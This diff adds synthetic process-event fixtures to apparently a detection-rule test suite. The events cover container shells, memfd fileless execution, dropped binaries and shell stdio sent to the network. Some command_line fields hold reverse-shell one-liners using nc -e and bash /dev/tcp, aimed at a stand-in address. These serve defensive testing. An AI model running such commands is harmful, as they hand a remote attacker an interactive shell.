@@ -2497,5 +2497,679 @@
     },
     "hit": false,
     "signal": false
+  },
+  {
+    "name": "terminal_shell_in_container/positive-0",
+    "rule": "9625ad24-b63b-46f6-9e45-c4208e7d144d",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/bin/bash"
+        },
+        "name": "bash",
+        "cmd_line": "bash",
+        "parent_process": {
+          "file": {
+            "path": "/usr/bin/runc"
+          },
+          "name": "runc"
+        },
+        "tty": "pts/0"
+      },
+      "container": {
+        "name": "app",
+        "runtime": "docker",
+        "uid": "4f173e0d45b0"
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "terminal_shell_in_container/positive-1",
+    "rule": "9625ad24-b63b-46f6-9e45-c4208e7d144d",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/bin/sh"
+        },
+        "name": "sh",
+        "cmd_line": "sh",
+        "parent_process": {
+          "file": {
+            "path": "/usr/bin/containerd-shim-runc-v2"
+          },
+          "name": "containerd-shim-runc-v2"
+        },
+        "tty": "pts/1"
+      },
+      "container": {
+        "name": "app",
+        "runtime": "docker",
+        "uid": "4f173e0d45b0"
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "terminal_shell_in_container/negative-0",
+    "rule": "9625ad24-b63b-46f6-9e45-c4208e7d144d",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/bin/bash"
+        },
+        "name": "bash",
+        "cmd_line": "bash",
+        "parent_process": {
+          "file": {
+            "path": "/usr/bin/runc"
+          },
+          "name": "runc"
+        }
+      },
+      "container": {
+        "name": "app",
+        "runtime": "docker",
+        "uid": "4f173e0d45b0"
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "terminal_shell_in_container/negative-1",
+    "rule": "9625ad24-b63b-46f6-9e45-c4208e7d144d",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/bin/bash"
+        },
+        "name": "bash",
+        "cmd_line": "bash",
+        "parent_process": {
+          "file": {
+            "path": "/bin/bash"
+          },
+          "name": "bash"
+        },
+        "tty": "pts/0"
+      },
+      "container": {
+        "name": "app",
+        "runtime": "docker",
+        "uid": "4f173e0d45b0"
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "terminal_shell_in_container/negative-2",
+    "rule": "9625ad24-b63b-46f6-9e45-c4208e7d144d",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/bin/bash"
+        },
+        "name": "bash",
+        "cmd_line": "bash",
+        "parent_process": {
+          "file": {
+            "path": "/usr/bin/runc"
+          },
+          "name": "runc"
+        },
+        "tty": "pts/0"
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "system_user_interactive/positive-0",
+    "rule": "29a1a49a-29b5-47c7-bedc-29a37bbb63bf",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/bin/bash"
+        },
+        "name": "bash",
+        "cmd_line": "bash -i",
+        "tty": "pts/2"
+      },
+      "actor": {
+        "user": {
+          "name": "www-data"
+        }
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "system_user_interactive/negative-0",
+    "rule": "29a1a49a-29b5-47c7-bedc-29a37bbb63bf",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/bin/sh"
+        },
+        "name": "sh",
+        "cmd_line": "sh -c id"
+      },
+      "actor": {
+        "user": {
+          "name": "www-data"
+        }
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "system_user_interactive/negative-1",
+    "rule": "29a1a49a-29b5-47c7-bedc-29a37bbb63bf",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/bin/bash"
+        },
+        "name": "bash",
+        "cmd_line": "bash",
+        "tty": "pts/0"
+      },
+      "actor": {
+        "user": {
+          "name": "root"
+        }
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "fileless_memfd_exec/positive-0",
+    "rule": "89a76954-4ab3-4653-b495-7f794f708dfb",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/memfd:payload (deleted)"
+        },
+        "name": "memfd:payload (deleted)",
+        "cmd_line": "[kworker/0:1]"
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "fileless_memfd_exec/negative-0",
+    "rule": "89a76954-4ab3-4653-b495-7f794f708dfb",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/memfd:runc_cloned:/proc/self/exe (deleted)"
+        },
+        "name": "exe (deleted)",
+        "cmd_line": "runc init",
+        "parent_process": {
+          "file": {
+            "path": "/usr/bin/runc"
+          },
+          "name": "runc"
+        }
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "fileless_memfd_exec/negative-1",
+    "rule": "89a76954-4ab3-4653-b495-7f794f708dfb",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/memfd:lxc-attach (deleted)"
+        },
+        "name": "memfd:lxc-attach (deleted)",
+        "cmd_line": "lxc-attach"
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "fileless_memfd_exec/negative-2",
+    "rule": "89a76954-4ab3-4653-b495-7f794f708dfb",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/usr/bin/ls"
+        },
+        "name": "ls",
+        "cmd_line": "ls /memfd:"
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "drop_and_execute_in_container/positive-0",
+    "rule": "fc47e45c-4ec9-4cf4-b909-69ee8b69dd16",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/tmp/x",
+          "upper_layer": true
+        },
+        "name": "x",
+        "cmd_line": "/tmp/x"
+      },
+      "container": {
+        "name": "app",
+        "runtime": "docker",
+        "uid": "4f173e0d45b0"
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "drop_and_execute_in_container/negative-0",
+    "rule": "fc47e45c-4ec9-4cf4-b909-69ee8b69dd16",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/tmp/go-build123/b001/api.test",
+          "upper_layer": true
+        },
+        "name": "api.test",
+        "cmd_line": "/tmp/go-build123/b001/api.test -test.v"
+      },
+      "container": {
+        "name": "app",
+        "runtime": "docker",
+        "uid": "4f173e0d45b0"
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "drop_and_execute_in_container/negative-1",
+    "rule": "fc47e45c-4ec9-4cf4-b909-69ee8b69dd16",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/tmp/x",
+          "upper_layer": true
+        },
+        "name": "x",
+        "cmd_line": "/tmp/x"
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "drop_and_execute_in_container/negative-2",
+    "rule": "fc47e45c-4ec9-4cf4-b909-69ee8b69dd16",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/usr/bin/curl"
+        },
+        "name": "curl",
+        "cmd_line": "curl"
+      },
+      "container": {
+        "name": "app",
+        "runtime": "docker",
+        "uid": "4f173e0d45b0"
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "redirect_stdio_to_network_in_container/positive-0",
+    "rule": "90576a45-d7d4-4a12-b02a-495c760b99d1",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 99,
+      "process": {
+        "file": {
+          "path": "/bin/sh"
+        },
+        "name": "sh",
+        "cmd_line": "sh -i"
+      },
+      "container": {
+        "name": "app",
+        "runtime": "docker",
+        "uid": "4f173e0d45b0"
+      },
+      "stdio_socket": {
+        "fd": 0,
+        "protocol": "tcp"
+      },
+      "src_endpoint": {
+        "ip": "10.0.2.15",
+        "port": 50000
+      },
+      "dst_endpoint": {
+        "ip": "203.0.113.9",
+        "port": 4444
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "redirect_stdio_to_network_in_container/negative-0",
+    "rule": "90576a45-d7d4-4a12-b02a-495c760b99d1",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 99,
+      "process": {
+        "file": {
+          "path": "/usr/sbin/sshd"
+        },
+        "name": "sshd",
+        "cmd_line": "sshd: [rexeced]"
+      },
+      "container": {
+        "name": "app",
+        "runtime": "docker",
+        "uid": "4f173e0d45b0"
+      },
+      "stdio_socket": {
+        "fd": 0,
+        "protocol": "tcp"
+      },
+      "src_endpoint": {
+        "ip": "10.0.2.15",
+        "port": 50000
+      },
+      "dst_endpoint": {
+        "ip": "203.0.113.9",
+        "port": 4444
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "redirect_stdio_to_network_in_container/negative-1",
+    "rule": "90576a45-d7d4-4a12-b02a-495c760b99d1",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 99,
+      "process": {
+        "file": {
+          "path": "/bin/sh"
+        },
+        "name": "sh",
+        "cmd_line": "sh -i"
+      },
+      "stdio_socket": {
+        "fd": 0,
+        "protocol": "tcp"
+      },
+      "src_endpoint": {
+        "ip": "10.0.2.15",
+        "port": 50000
+      },
+      "dst_endpoint": {
+        "ip": "203.0.113.9",
+        "port": 4444
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "redirect_stdio_to_network_in_container/negative-2",
+    "rule": "90576a45-d7d4-4a12-b02a-495c760b99d1",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/bin/sh"
+        },
+        "name": "sh",
+        "cmd_line": "sh -i"
+      },
+      "container": {
+        "name": "app",
+        "runtime": "docker",
+        "uid": "4f173e0d45b0"
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "lnx_shell_stdio_to_network/positive-0",
+    "rule": "43ade2ed-38aa-486c-8629-cd561cf9787e",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 99,
+      "process": {
+        "file": {
+          "path": "/bin/bash"
+        },
+        "name": "bash",
+        "cmd_line": "bash -i"
+      },
+      "stdio_socket": {
+        "fd": 0,
+        "protocol": "tcp"
+      },
+      "src_endpoint": {
+        "ip": "10.0.2.15",
+        "port": 50000
+      },
+      "dst_endpoint": {
+        "ip": "203.0.113.9",
+        "port": 4444
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "lnx_shell_stdio_to_network/positive-1",
+    "rule": "43ade2ed-38aa-486c-8629-cd561cf9787e",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 99,
+      "process": {
+        "file": {
+          "path": "/usr/bin/python3.11"
+        },
+        "name": "python3.11",
+        "cmd_line": "python3 -c import pty"
+      },
+      "stdio_socket": {
+        "fd": 0,
+        "protocol": "tcp"
+      },
+      "src_endpoint": {
+        "ip": "10.0.2.15",
+        "port": 50000
+      },
+      "dst_endpoint": {
+        "ip": "203.0.113.9",
+        "port": 4444
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "lnx_shell_stdio_to_network/positive-2",
+    "rule": "43ade2ed-38aa-486c-8629-cd561cf9787e",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 99,
+      "process": {
+        "file": {
+          "path": "/usr/bin/nc"
+        },
+        "name": "nc",
+        "cmd_line": "nc 203.0.113.9 4444 -e /bin/sh"
+      },
+      "stdio_socket": {
+        "fd": 0,
+        "protocol": "tcp"
+      },
+      "src_endpoint": {
+        "ip": "10.0.2.15",
+        "port": 50000
+      },
+      "dst_endpoint": {
+        "ip": "203.0.113.9",
+        "port": 4444
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "lnx_shell_stdio_to_network/negative-0",
+    "rule": "43ade2ed-38aa-486c-8629-cd561cf9787e",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 99,
+      "process": {
+        "file": {
+          "path": "/usr/sbin/sshd"
+        },
+        "name": "sshd",
+        "cmd_line": "/usr/sbin/sshd -D -R"
+      },
+      "stdio_socket": {
+        "fd": 0,
+        "protocol": "tcp"
+      },
+      "src_endpoint": {
+        "ip": "10.0.2.15",
+        "port": 50000
+      },
+      "dst_endpoint": {
+        "ip": "203.0.113.9",
+        "port": 4444
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "lnx_shell_stdio_to_network/negative-1",
+    "rule": "43ade2ed-38aa-486c-8629-cd561cf9787e",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 99,
+      "process": {
+        "file": {
+          "path": "/usr/lib/openssh/sshd-session"
+        },
+        "name": "sshd-session",
+        "cmd_line": "sshd-session"
+      },
+      "stdio_socket": {
+        "fd": 0,
+        "protocol": "tcp"
+      },
+      "src_endpoint": {
+        "ip": "10.0.2.15",
+        "port": 50000
+      },
+      "dst_endpoint": {
+        "ip": "203.0.113.9",
+        "port": 4444
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "lnx_shell_stdio_to_network/negative-2",
+    "rule": "43ade2ed-38aa-486c-8629-cd561cf9787e",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/bin/bash"
+        },
+        "name": "bash",
+        "cmd_line": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"
+      }
+    },
+    "hit": false,
+    "signal": false
   }
 ]
